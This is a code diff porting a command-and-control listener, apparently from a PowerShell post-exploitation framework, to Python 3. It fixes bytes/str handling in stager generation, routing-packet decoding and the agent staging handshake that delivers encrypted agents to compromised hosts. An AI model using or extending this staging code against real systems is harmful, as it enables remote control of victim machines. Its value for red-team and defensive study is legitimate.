@@ -1,4 +1,6 @@
 from __future__ import print_function
+
+import json
 from builtins import str
 from builtins import object
 import logging
@@ -236,7 +238,7 @@ class Listener(object):
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                b64RoutingPacket = base64.b64encode(routingPacket).decode('UTF-8')
 
                 # add the RC4 packet to a cookie
                 stager += helpers.randomize_capitalization('$mail = $'+helpers.generate_random_script_var_name("GPF")+'.CreateItem(0);$mail.Subject = "')
@@ -354,7 +356,7 @@ class Listener(object):
         killDate = listenerOptions['KillDate']['Value']
         folder = listenerOptions['Folder']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
-        b64DefaultResponse = base64.b64encode(self.default_response())
+        b64DefaultResponse = base64.b64encode(self.default_response().encode('UTF-8'))
 
         if language == 'powershell':
 
@@ -381,7 +383,7 @@ class Listener(object):
             code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
             code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
             code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
+            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "' + b64DefaultResponse.decode('UTF-8') + '"')
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
@@ -556,7 +558,7 @@ class Listener(object):
                             if part.startswith('session'):
                                 base64RoutingPacket = part[part.find('=')+1:]
                                 # decode the routing packet base64 value in the cookie
-                                routingPacket = base64.b64decode(base64RoutingPacket)
+                                routingPacket = base64.b64decode(base64RoutingPacket).decode('UTF-8')
                 except Exception as e:
                     routingPacket = None
                     pass
@@ -566,8 +568,10 @@ class Listener(object):
                 dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, clientIP)
                 if dataResults and len(dataResults) > 0:
                     for (language, results) in dataResults:
+                        if isinstance(results, str):
+                            results = results.encode('UTF-8')
                         if results:
-                            if results == 'STAGE0':
+                            if results == b'STAGE0':
                                 # handle_agent_data() signals that the listener should return the stager.ps1 code
 
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
@@ -575,12 +579,12 @@ class Listener(object):
                                 stage = self.generate_stager(language=language, listenerOptions=listenerOptions)
                                 return make_response(stage, 200)
 
-                            elif results.startswith('ERROR:'):
+                            elif results.startswith(b'ERROR:'):
                                 dispatcher.send("[!] Error from agents.handle_agent_data() for %s from %s: %s" % (request_uri, clientIP, results), sender='listeners/http')
 
-                                if 'not in cache' in results:
+                                if b'not in cache' in results:
                                     # signal the client to restage
-                                    print(helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP)))
+                                    print(helpers.color("[*] Orphaned agent from %s, signaling restaging" % (clientIP)))
                                     return make_response(self.default_response(), 401)
                                 else:
                                     return make_response(self.default_response(), 200)
@@ -616,10 +620,12 @@ class Listener(object):
 
             if dataResults and len(dataResults) > 0:
                 for (language, results) in dataResults:
+                    if isinstance(results, str):
+                        results = results.encode('UTF-8')
                     if results:
-                        if results.startswith('STAGE2'):
+                        if results.startswith(b'STAGE2'):
                             # TODO: document the exact results structure returned
-                            sessionID = results.split(' ')[1].strip()
+                            sessionID = results.split(b' ')[1].strip().decode('UTF-8')
                             sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
                             dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender='listeners/http')
 
@@ -630,10 +636,10 @@ class Listener(object):
 
                             return make_response(encryptedAgent, 200)
 
-                        elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
+                        elif results[:10].lower().startswith(b'error') or results[:10].lower().startswith(b'exception'):
                             dispatcher.send("[!] Error returned for results by %s : %s" %(clientIP, results), sender='listeners/http')
                             return make_response(self.default_response(), 200)
-                        elif results == 'VALID':
+                        elif results == b'VALID':
                             dispatcher.send("[*] Valid results return by %s" % (clientIP), sender='listeners/http')
                             return make_response(self.default_response(), 200)
                         else:
